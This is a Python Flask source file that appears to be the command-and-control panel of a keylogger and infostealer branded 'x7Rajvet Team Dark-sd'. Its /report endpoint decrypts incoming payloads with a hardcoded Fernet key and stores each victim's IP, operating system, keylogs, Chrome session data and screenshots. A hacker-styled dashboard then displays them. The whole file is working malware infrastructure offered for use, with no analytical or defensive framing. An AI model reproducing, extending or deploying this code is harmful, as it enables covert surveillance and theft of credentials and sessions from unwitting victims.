from flask import Flask, render_template_string, request
from cryptography.fernet import Fernet
import json, datetime

app = Flask(__name__)
KEY = b"FUqivB8jbMBTcru1OtQo77xM2ya4QQYHUVKnW2H3C0w="
cipher_suite = Fernet(KEY)

victims_list = []

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>TERMINAL | x7Rajvet Team Dark-sd</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
        .main { position: relative; z-index: 1; height: 100vh; overflow-y: auto; padding: 20px; }
        .header { border-bottom: 2px solid #00ff41; text-align: center; padding: 10px; margin-bottom: 20px; text-shadow: 0 0 10px #00ff41; }
        table { width: 100%; border-collapse: collapse; background: rgba(0, 15, 0, 0.9); }
        th, td { border: 1px solid #00ff41; padding: 12px; text-align: left; vertical-align: top; }
        th { background: #004400; color: #fff; }
        .scroll-box { max-height: 200px; overflow-y: auto; font-size: 11px; color: #00ff41; border: 1px solid #003300; padding: 5px; background: #000; white-space: pre-wrap; }
        img { max-width: 250px; border: 1px solid #00ff41; cursor: pointer; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="main">
        <div class="header">
            <h1>[ x7Rajvet Team Dark-sd - CONTROL PANEL ]</h1>
            <p>SESSIONS LOGGING ACTIVE | AES-256 ENCRYPTION</p>
        </div>
        <table>
            <tr>
                <th>TIME</th>
                <th>TARGET</th>
                <th>KEYLOGS / ACTIVITY</th>
                <th>CHROME SESSIONS / SCREEN</th>
            </tr>
            {% for v in victims %}
            <tr>
                <td>{{ v.time }}</td>
                <td><b>IP: {{ v.ip }}</b><br><small>{{ v.os }}</small></td>
                <td><div class="scroll-box">{{ v.logs }}</div></td>
                <td>
                    <div class="scroll-box">
                        {% if "data:image" in v.data %}
                            <img src="{{ v.data }}" onclick="window.open(this.src)">
                        {% else %}
                            {{ v.data }}
                        {% endif %}
                    </div>
                </td>
            </tr>
            {% endfor %}
        </table>
    </div>
    <script>
        const c = document.getElementById("matrix"); const ctx = c.getContext("2d");
        c.height = window.innerHeight; c.width = window.innerWidth;
        const letters = "01X7RAJVETDARKSD"; const fontSize = 14;
        const columns = c.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
            drops.forEach((y, i) => {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, y * fontSize);
                if (y * fontSize > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 35);
    </script>
</body>
</html>
"""

@app.route('/report', methods=['POST'])
def report():
    try:
        raw = request.json.get('data')
        dec = json.loads(cipher_suite.decrypt(raw.encode()).decode())
        victims_list.insert(0, {
            "time": datetime.datetime.now().strftime("%H:%M:%S"),
            "ip": request.remote_addr,
            "os": dec.get('os'),
            "logs": dec.get('logs'),
            "data": dec.get('data')
        })
        return "OK", 200
    except Exception as e:
        print(f"Error: {e}")
        return "Fail", 500

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, victims=victims_list)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)